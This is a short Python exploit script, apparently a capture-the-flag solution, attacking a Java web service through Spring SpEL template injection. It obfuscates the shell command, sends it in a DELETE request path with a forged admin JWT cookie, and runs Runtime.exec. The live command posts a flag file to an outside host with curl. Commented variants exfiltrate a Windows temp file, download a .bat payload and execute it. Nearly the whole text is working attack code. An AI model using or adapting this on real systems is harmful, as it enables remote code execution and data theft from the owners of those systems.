import string
import requests
from urllib.parse import quote

def encode(s):
    ret = ''
    for c in s:
        if ret == '':
            ret += f'T(java.lang.Character).toString({ord(c)})'
        else:
            ret += '.concat(' + f'T(java.lang.Character).toString({ord(c)})' + ')'
    return ret

cookies = {
    'SESSION': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4iLCJpc3MiOiJYWC1NYW5hZ2VyIiwiaWF0IjoxNjA1NzQ5MTAwfQ.Yihr_zCEo90TPRsCa_yzkt8w_YIE1j4D4hkGdSl-xcA'
}
s = requests.session()

#cmd = 'curl kaibro.tw:5278/?a=3 -F a=@C:\\windows\\temp\\kaibroshit'
#cmd = 'curl kaibro.tw:5278/?a=3 -F a=@C:\\windows\\temp\\aaaaa'
#cmd = 'curl kaibro.tw/win -o C:\\windows\\temp\\kaibroshit.bat'
#cmd = 'cmd /c C:\\windows\\temp\\kaibroshit.bat'
cmd = 'curl kaibro.tw:5278/?a=3 -F a=@flag'

path = '''
__${T(java.lang.Runtime).getRuntime().exec(THESTR)}__::..x
'''.strip().replace('THESTR', encode(cmd))
r = s.delete('http://180.163.241.5:10002/auth/user/' + path, cookies=cookies)
print(r.text)
